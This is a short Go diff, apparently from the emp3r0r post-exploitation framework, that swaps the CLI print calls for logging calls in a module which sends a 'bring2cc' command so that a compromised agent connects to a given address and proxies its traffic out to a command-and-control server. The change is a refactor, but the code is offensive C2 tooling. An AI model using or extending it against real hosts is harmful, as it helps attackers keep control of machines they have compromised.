@@ -12,14 +12,14 @@ import (
 func moduleBring2CC() {
 	addrOpt, ok := CurrentModuleOptions["addr"]
 	if !ok {
-		CliPrintError("Option 'addr' not found")
+		LogError("Option 'addr' not found")
 		return
 	}
 	addr := addrOpt.Val
 
 	kcpOpt, ok := CurrentModuleOptions["kcp"]
 	if !ok {
-		CliPrintError("Option 'kcp' not found")
+		LogError("Option 'kcp' not found")
 		return
 	}
 	use_kcp := kcpOpt.Val
@@ -27,8 +27,8 @@ func moduleBring2CC() {
 	cmd := fmt.Sprintf("%s --addr %s --kcp %s", emp3r0r_def.C2CmdBring2CC, addr, use_kcp)
 	err := SendCmd(cmd, "", CurrentTarget)
 	if err != nil {
-		CliPrintError("SendCmd: %v", err)
+		LogError("SendCmd: %v", err)
 		return
 	}
-	CliPrintInfo("agent %s is connecting to %s to proxy it out to C2", CurrentTarget.Tag, addr)
+	LogInfo("agent %s is connecting to %s to proxy it out to C2", CurrentTarget.Tag, addr)
 }
